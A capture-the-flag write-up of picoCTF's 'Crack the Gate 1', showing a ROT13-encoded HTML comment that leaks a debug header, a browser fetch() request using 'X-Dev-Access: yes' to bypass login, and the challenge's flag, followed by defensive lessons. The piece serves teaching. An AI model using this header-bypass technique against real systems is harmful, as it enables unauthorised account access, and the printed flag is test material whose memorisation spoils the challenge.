# 🧩 CTF Challenge Writeup  
**Challenge Name:** Crack the Gate 1  
**Category:** Web Exploitation  
**Difficulty:** Easy  
**Platform:** picoCTF (picoMini by CMU-Africa)  
**Author:** Yahaya Meddy  
**Date:** 12-01-26

---

## 🔍 1. Challenge Description
In this challenge, we are given access to a **restricted web portal** where a user  
`ctf-player@picoctf.org` is believed to be hiding sensitive data.

The password is unknown, and standard login attempts fail.  
However, the description hints that:

> *“something feels off… it’s almost like the developer left a secret way in.”*

The objective is to **bypass authentication** and retrieve the hidden flag.

---

## 🧠 2. Initial Thoughts / Approach
Given the **Web Exploitation** category and **Easy** difficulty, likely attack vectors included:

- Client-side or logic-based authentication flaws  
- Hidden developer comments  
- Debug backdoors or special headers  
- Obfuscated hints (ROT13, Base64, etc.)

The challenge title **“Crack the Gate”** suggested that the *login itself* was not the real obstacle, but rather a **hidden access gate**.

---

## 🛠️ 3. Steps to Solve

### 3.1 Launch the instance and test login
After launching the instance, a simple login form is presented.

Any login attempt returns:
```json
{
  "success": false,
  "error": "Unauthorized access."
}
```
This indicates:
- Brute force is ineffective
- Backend authentication is working
- The vulnerability lies elsewhere
### 3.2 Inspect page source
Using View Page Source (Ctrl + U / Cmd + Option + U), the raw HTML is inspected.

A suspicious HTML comment is found:
```html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```
### 3.3 Decode the message (ROT13)
The challenge hints mention rotating letters by 13 positions, indicating ROT13.

Decoded message:
```text
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```
This reveals a developer backdoor via a custom HTTP header.
### 3.4 Exploit the developer backdoor
Using the browser console, a login request is sent with the hidden header:
```js
fetch("/login", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "X-Dev-Access": "yes"
  },
  body: JSON.stringify({
    email: "ctf-player@picoctf.org",
    password: "anything"
  })
})
.then(r => r.json())
.then(console.log);
```
### 3.5 Retrieve the flag
The server responds with:
```json
{
  "success": true,
  "email": "ctf-player@picoctf.org",
  "firstName": "pico",
  "lastName": "player",
  "flag": "picoCTF{brut4_forc4_125f752d}"
}
```
Authentication is successfully bypassed.

---
## 🧩  4. Final Flag 
```bash
picoCTF{brut4_forc4_125f752d}
```

---
## 📚 5. Key Learnings
- HTML comments can leak sensitive developer information
- ROT13 is obfuscation, not encryption
- Debug headers should never exist in production
- Authentication bypasses don’t always involve passwords
- Logic flaws are common in beginner web challenges

---
## 🚀 6. Improvements for Next Time
- Always inspect raw HTML source
- Decode any suspicious or obfuscated strings immediately
- Look for keywords like debug, temporary, or bypass
- Test for undocumented headers in authentication flows
- Treat login forms in Easy challenges as potential decoys

---
## 🔗 7. References
- picoCTF Web Exploitation Challenges
- ROT13 Cipher
- OWASP: Broken Authentication
- Debug Backdoors in Web Applications